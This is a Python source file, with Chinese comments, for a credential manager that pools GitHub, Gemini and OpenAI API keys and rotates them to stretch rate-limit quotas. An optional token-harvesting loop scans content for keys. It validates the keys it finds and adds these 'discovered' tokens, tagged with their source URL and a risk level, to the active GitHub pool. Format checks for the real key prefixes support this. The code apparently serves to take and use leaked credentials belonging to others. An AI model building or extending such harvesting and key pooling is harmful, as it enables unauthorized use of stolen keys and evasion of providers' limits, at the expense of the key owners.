"""
凭证管理器核心实现
"""

import asyncio
import threading
import time
from typing import Dict, List, Optional, Any, Callable
from datetime import datetime, timedelta
import logging
import json
from pathlib import Path

from .models import (
    Credential, 
    CredentialStatus, 
    ServiceType, 
    CredentialPool,
    CredentialMetrics
)
from ..storage.vault import CredentialVault
from ..balancer.strategies import LoadBalancingStrategy, get_strategy
from ..healing.health_check import HealthChecker
from ..discovery.token_harvester import TokenHarvester, get_token_harvester

# 配置日志
logger = logging.getLogger(__name__)


class CredentialManager:
    """
    凭证管理器主类
    负责协调所有子系统
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        """
        初始化凭证管理器
        
        Args:
            config: 配置字典
        """
        self.config = config or self._get_default_config()
        
        # 凭证池（按服务类型分组）
        self.pools: Dict[ServiceType, CredentialPool] = {}
        
        # 存储层
        self.vault = CredentialVault(
            encryption_enabled=self.config.get("encryption_enabled", True)
        )
        
        # 负载均衡策略
        strategy_name = self.config.get("balancing_strategy", "quota_aware")
        self.balancer: LoadBalancingStrategy = get_strategy(strategy_name)
        
        # 健康检查器
        self.health_checker = HealthChecker(self)
        
        # Token收集器（可选功能）
        self.token_harvester = None
        if self.config.get("harvesting_enabled", False):
            self.token_harvester = get_token_harvester(self.config)
        
        # 线程锁
        self.lock = threading.RLock()
        
        # 回调函数
        self.callbacks: Dict[str, List[Callable]] = {
            "on_credential_added": [],
            "on_credential_removed": [],
            "on_credential_exhausted": [],
            "on_pool_low": []
        }
        
        # 统计信息
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "credentials_discovered": 0,
            "credentials_validated": 0,
            "credentials_archived": 0
        }
        
        # 初始化凭证池
        self._initialize_pools()
        
        # 启动后台任务
        self._start_background_tasks()
        
        logger.info(f"CredentialManager initialized with config: {self.config}")
    
    def _get_default_config(self) -> Dict[str, Any]:
        """获取默认配置"""
        return {
            "encryption_enabled": True,
            "balancing_strategy": "quota_aware",
            "min_pool_size": 10,
            "max_pool_size": 100,
            "health_check_interval": 60,
            "discovery_enabled": True,
            "discovery_interval": 300,
            "auto_recovery": True,
            "predictive_maintenance": True,
            "harvesting_enabled": False  # Token收集功能默认关闭
        }
    
    def _initialize_pools(self):
        """初始化凭证池"""
        for service_type in ServiceType:
            self.pools[service_type] = CredentialPool(
                service_type=service_type,
                min_pool_size=self.config.get("min_pool_size", 10),
                max_pool_size=self.config.get("max_pool_size", 100)
            )
        
        # 从存储加载现有凭证
        self._load_from_storage()
    
    def _load_from_storage(self):
        """从存储加载凭证"""
        try:
            credentials = self.vault.load_all()
            for cred_data in credentials:
                credential = self._deserialize_credential(cred_data)
                if credential and credential.is_valid():
                    pool = self.pools.get(credential.service_type)
                    if pool:
                        pool.add(credential)
            
            logger.info(f"Loaded {len(credentials)} credentials from storage")
        except Exception as e:
            logger.error(f"Failed to load credentials from storage: {e}")
    
    def _deserialize_credential(self, data: Dict[str, Any]) -> Optional[Credential]:
        """反序列化凭证"""
        try:
            service_type = ServiceType(data.get("service_type", "custom"))
            status = CredentialStatus(data.get("status", "pending"))
            
            credential = Credential(
                id=data.get("id", ""),
                service_type=service_type,
                value=data.get("value", ""),
                status=status,
                remaining_quota=data.get("remaining_quota", 0),
                total_quota=data.get("total_quota", 0),
                source=data.get("source", "unknown"),
                metadata=data.get("metadata", {})
            )
            
            # 恢复时间戳
            if data.get("reset_time"):
                credential.reset_time = datetime.fromisoformat(data["reset_time"])
            if data.get("expires_at"):
                credential.expires_at = datetime.fromisoformat(data["expires_at"])
            
            return credential
        except Exception as e:
            logger.error(f"Failed to deserialize credential: {e}")
            return None
    
    def _start_background_tasks(self):
        """启动后台任务"""
        # 健康检查线程
        if self.config.get("health_check_interval", 0) > 0:
            health_thread = threading.Thread(
                target=self._health_check_loop,
                daemon=True
            )
            health_thread.start()
        
        # 发现引擎线程
        if self.config.get("discovery_enabled", False):
            discovery_thread = threading.Thread(
                target=self._discovery_loop,
                daemon=True
            )
            discovery_thread.start()
    
    def _health_check_loop(self):
        """健康检查循环"""
        interval = self.config.get("health_check_interval", 60)
        
        while True:
            try:
                time.sleep(interval)
                self.health_checker.check_all_pools()
                
                # 检查是否需要补充凭证
                for service_type, pool in self.pools.items():
                    if pool.needs_replenishment():
                        logger.warning(f"Pool {service_type.value} needs replenishment")
                        self._trigger_callback("on_pool_low", service_type)
                
            except Exception as e:
                logger.error(f"Health check error: {e}")
    
    def _discovery_loop(self):
        """凭证发现循环"""
        interval = self.config.get("discovery_interval", 300)
        
        while True:
            try:
                time.sleep(interval)
                logger.info("Running credential discovery...")
                
                # 如果启用了Token收集器
                if self.token_harvester and self.token_harvester.enabled:
                    self._run_token_harvesting()
                
            except Exception as e:
                logger.error(f"Discovery error: {e}")
    
    # ========== 公共API ==========
    
    def add_credential(self, 
                      service_type: ServiceType,
                      value: str,
                      metadata: Dict[str, Any] = None) -> Optional[Credential]:
        """
        添加新凭证
        
        Args:
            service_type: 服务类型
            value: 凭证值
            metadata: 元数据
            
        Returns:
            添加的凭证对象，失败返回None
        """
        with self.lock:
            try:
                # 创建凭证对象
                credential = Credential(
                    service_type=service_type,
                    value=value,
                    status=CredentialStatus.PENDING,
                    source="manual",
                    metadata=metadata or {}
                )
                
                # 验证凭证
                if not self._validate_credential(credential):
                    logger.warning(f"Invalid credential: {credential.masked_value}")
                    return None
                
                # 添加到池
                pool = self.pools.get(service_type)
                if not pool:
                    logger.error(f"No pool for service type: {service_type}")
                    return None
                
                if not pool.add(credential):
                    logger.warning(f"Failed to add credential to pool")
                    return None
                
                # 保存到存储
                self.vault.save(credential)
                
                # 更新统计
                self.stats["credentials_discovered"] += 1
                
                # 触发回调
                self._trigger_callback("on_credential_added", credential)
                
                logger.info(f"Added credential: {credential.masked_value}")
                return credential
                
            except Exception as e:
                logger.error(f"Failed to add credential: {e}")
                return None
    
    def import_credential(self,
                         service_type: str,
                         credential: str,
                         metadata: Dict[str, Any] = None) -> bool:
        """
        导入凭证（兼容接口）
        
        Args:
            service_type: 服务类型字符串
            credential: 凭证值
            metadata: 元数据
            
        Returns:
            是否成功
        """
        try:
            service = ServiceType(service_type)
            result = self.add_credential(service, credential, metadata)
            return result is not None
        except Exception as e:
            logger.error(f"Failed to import credential: {e}")
            return False
    
    def get_optimal_credential(self, service_type: ServiceType) -> Optional[Credential]:
        """
        获取最优凭证
        
        Args:
            service_type: 服务类型
            
        Returns:
            最优凭证，无可用返回None
        """
        with self.lock:
            pool = self.pools.get(service_type)
            if not pool:
                return None
            
            # 获取所有可用凭证
            available = pool.get_available()
            if not available:
                logger.warning(f"No available credentials for {service_type.value}")
                return None
            
            # 使用负载均衡策略选择
            selected = self.balancer.select(available)
            
            if selected:
                # 更新使用时间
                selected.last_used = datetime.now()
                
                # 更新统计
                self.stats["total_requests"] += 1
                
                logger.debug(f"Selected credential: {selected.masked_value}")
            
            return selected
    
    def update_credential_status(self,
                                credential_value: str,
                                headers: Dict[str, str] = None,
                                success: bool = True) -> bool:
        """
        更新凭证状态
        
        Args:
            credential_value: 凭证值
            headers: 响应头（包含配额信息）
            success: 请求是否成功
            
        Returns:
            是否更新成功
        """
        with self.lock:
            # 查找凭证
            credential = self._find_credential_by_value(credential_value)
            if not credential:
                return False
            
            # 更新指标
            response_time = headers.get("X-Response-Time", 1.0) if headers else 1.0
            credential.metrics.update(success, float(response_time))
            
            # 更新配额（如果有）
            if headers:
                remaining = headers.get("X-RateLimit-Remaining")
                limit = headers.get("X-RateLimit-Limit")
                reset = headers.get("X-RateLimit-Reset")
                
                if remaining is not None:
                    reset_time = None
                    if reset:
                        reset_time = datetime.fromtimestamp(int(reset))
                    
                    credential.update_quota(
                        int(remaining),
                        int(limit) if limit else None,
                        reset_time
                    )
            
            # 更新统计
            if success:
                self.stats["successful_requests"] += 1
            else:
                self.stats["failed_requests"] += 1
                
                # 连续失败检查
                if credential.metrics.error_count > 10:
                    credential.status = CredentialStatus.INVALID
                    logger.warning(f"Credential marked as invalid: {credential.masked_value}")
            
            # 检查是否耗尽
            if credential.status == CredentialStatus.EXHAUSTED:
                self._trigger_callback("on_credential_exhausted", credential)
            
            # 保存更新
            self.vault.save(credential)
            
            return True
    
    def _find_credential_by_value(self, value: str) -> Optional[Credential]:
        """根据值查找凭证"""
        for pool in self.pools.values():
            for credential in pool.credentials:
                if credential.value == value:
                    return credential
        return None
    
    def _validate_credential(self, credential: Credential) -> bool:
        """验证凭证格式"""
        if not credential.value:
            return False
        
        # 根据服务类型验证格式
        validators = {
            ServiceType.GITHUB: self._validate_github_token,
            ServiceType.GEMINI: self._validate_gemini_key,
            ServiceType.OPENAI: self._validate_openai_key
        }
        
        validator = validators.get(credential.service_type)
        if validator:
            return validator(credential.value)
        
        # 默认通过
        return True
    
    def _validate_github_token(self, token: str) -> bool:
        """验证GitHub Token格式"""
        if token.startswith("ghp_") and len(token) > 10:
            return True
        if token.startswith("github_pat_") and len(token) > 20:
            return True
        if len(token) == 40 and all(c in "0123456789abcdef" for c in token.lower()):
            return True
        return False
    
    def _validate_gemini_key(self, key: str) -> bool:
        """验证Gemini API Key格式"""
        return key.startswith("AIzaSy") and len(key) == 39
    
    def _validate_openai_key(self, key: str) -> bool:
        """验证OpenAI API Key格式"""
        return key.startswith("sk-") and len(key) > 20
    
    def _trigger_callback(self, event: str, *args, **kwargs):
        """触发回调函数"""
        callbacks = self.callbacks.get(event, [])
        for callback in callbacks:
            try:
                callback(*args, **kwargs)
            except Exception as e:
                logger.error(f"Callback error for {event}: {e}")
    
    def register_callback(self, event: str, callback: Callable):
        """注册回调函数"""
        if event in self.callbacks:
            self.callbacks[event].append(callback)
    
    def get_status(self) -> Dict[str, Any]:
        """获取系统状态"""
        with self.lock:
            status = {
                "pools": {},
                "stats": self.stats.copy(),
                "config": self.config.copy()
            }
            
            for service_type, pool in self.pools.items():
                status["pools"][service_type.value] = pool.get_statistics()
            
            return status
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取统计信息（兼容旧接口）"""
        with self.lock:
            # 统计各状态的凭证数量
            by_status = {}
            total_credentials = 0
            total_health_score = 0
            
            for pool in self.pools.values():
                for credential in pool.credentials:
                    total_credentials += 1
                    status_name = credential.status.value
                    by_status[status_name] = by_status.get(status_name, 0) + 1
                    total_health_score += credential.calculate_health_score()
            
            return {
                'total_credentials': total_credentials,
                'by_status': by_status,
                'average_health_score': total_health_score / total_credentials if total_credentials > 0 else 0,
                'pools': {service_type.value: pool.get_statistics() for service_type, pool in self.pools.items()},
                'stats': self.stats.copy()
            }
    
    def get_all_credentials(self, service_type: ServiceType = None) -> List[Credential]:
        """获取所有凭证"""
        with self.lock:
            if service_type:
                pool = self.pools.get(service_type)
                return pool.credentials if pool else []
            
            all_credentials = []
            for pool in self.pools.values():
                all_credentials.extend(pool.credentials)
            return all_credentials
    
    def remove_credential(self, credential_id: str) -> bool:
        """移除凭证"""
        with self.lock:
            for pool in self.pools.values():
                if pool.remove(credential_id):
                    self.vault.delete(credential_id)
                    self._trigger_callback("on_credential_removed", credential_id)
                    return True
            return False
    
    def archive_credential(self, credential_id: str, reason: str = "manual") -> bool:
        """归档凭证"""
        with self.lock:
            credential = None
            
            # 查找凭证
            for pool in self.pools.values():
                for cred in pool.credentials:
                    if cred.id == credential_id:
                        credential = cred
                        break
                if credential:
                    break
            
            if not credential:
                return False
            
            # 更新状态
            credential.status = CredentialStatus.ARCHIVED
            credential.metadata["archive_reason"] = reason
            credential.metadata["archive_time"] = datetime.now().isoformat()
            
            # 保存归档
            self.vault.archive(credential)
            
            # 从池中移除
            self.remove_credential(credential_id)
            
            # 更新统计
            self.stats["credentials_archived"] += 1
            
            logger.info(f"Archived credential: {credential.masked_value} (reason: {reason})")
            return True
    
    def shutdown(self):
        """关闭管理器"""
        logger.info("Shutting down CredentialManager...")
        
        # 保存所有凭证
        with self.lock:
            for pool in self.pools.values():
                for credential in pool.credentials:
                    self.vault.save(credential)
        
        logger.info("CredentialManager shutdown complete")
    
    def _run_token_harvesting(self):
        """运行Token收集流程"""
        if not self.token_harvester or not self.token_harvester.enabled:
            return
        
        try:
            # 清理过期tokens
            self.token_harvester.cleanup_expired_tokens()
            
            # 检查是否应该使用发现的tokens
            if self.token_harvester.should_use_discovered_token():
                best_token = self.token_harvester.get_best_discovered_token()
                
                if best_token:
                    # 将发现的token添加到池中
                    metadata = {
                        "source": "discovered",
                        "risk_level": best_token.risk_level.name,
                        "discovered_at": best_token.discovered_at.isoformat(),
                        "source_url": best_token.source_url
                    }
                    
                    # 添加到GitHub池
                    result = self.add_credential(
                        ServiceType.GITHUB,
                        best_token.token,
                        metadata
                    )
                    
                    if result:
                        logger.info(f"✅ Added discovered token to pool: {best_token.masked_token}")
                        self.token_harvester.stats['total_added'] += 1
                    else:
                        self.token_harvester.stats['total_rejected'] += 1
            
            # 记录统计
            stats = self.token_harvester.get_statistics()
            logger.info(f"Token harvesting stats: {stats}")
            
        except Exception as e:
            logger.error(f"Token harvesting error: {e}")
    
    async def scan_content_for_tokens(self, content: str, source_url: str = "") -> int:
        """
        扫描内容中的tokens
        
        Args:
            content: 要扫描的内容
            source_url: 内容来源
            
        Returns:
            发现的token数量
        """
        if not self.token_harvester or not self.token_harvester.enabled:
            return 0
        
        discovered = self.token_harvester.extract_tokens_from_content(content, source_url)
        
        # 验证发现的tokens
        validated_count = 0
        for token in discovered:
            if await self.token_harvester.validate_token(token):
                validated_count += 1
        
        return validated_count


# 全局实例
_manager_instance: Optional[CredentialManager] = None


def get_credential_manager(config: Dict[str, Any] = None) -> CredentialManager:
    """获取全局凭证管理器实例"""
    global _manager_instance
    if _manager_instance is None:
        _manager_instance = CredentialManager(config)
    return _manager_instance